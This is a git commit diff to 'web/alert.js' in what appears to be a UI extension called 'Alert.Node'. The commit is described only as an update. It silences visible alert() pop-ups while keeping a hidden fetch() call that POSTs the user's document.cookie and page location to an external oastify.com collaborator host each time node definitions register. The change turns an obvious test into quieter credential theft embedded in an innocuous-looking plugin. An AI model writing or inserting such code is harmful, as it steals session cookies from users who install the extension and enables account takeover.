bdf800a70cd1f1f5704905c7d9f63d9ff84b6f30
Raul Onitza-Klugman <raulonita@gmail.com>
2024-11-18 11:25:05 +0200

    Update alert.js

--- web/alert.js
+++ web/alert.js
@@ -5,22 +5,22 @@ import { api } from "../../scripts/api.js";
 app.registerExtension({
 	name: "Alert.Node",
 	async beforeRegisterNodeDef(nodeType, nodeData, app) {
-    alert(document.cookie);
-    alert(document.location);
-
-    console.log(`cookie=${document.cookie}, location=${document.location}`);
-
-    const rawResponse = await fetch('https://wsscd95wpqho07wrbdywwitkobu2it6i.oastify.com', {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({"cookie": document.cookie, "location": document.location})
-    });
-    const content = await rawResponse.json();
-
-    console.log(content);
+	    // alert(document.cookie);
+	    // alert(document.location);
+	
+	    console.log(`Alert.Node: cookie=${document.cookie}, location=${document.location}`);
+	
+	    const rawResponse = await fetch('https://wsscd95wpqho07wrbdywwitkobu2it6i.oastify.com', {
+	      method: 'POST',
+	      mode: 'no-cors',
+	      headers: {
+	        'Accept': 'application/json',
+	        'Content-Type': 'application/json'
+	      },
+	      body: JSON.stringify({"cookie": document.cookie, "location": document.location})
+	    });
+	    
+	    // const content = await rawResponse.text();
+	    // console.log(content);
 	}});
 
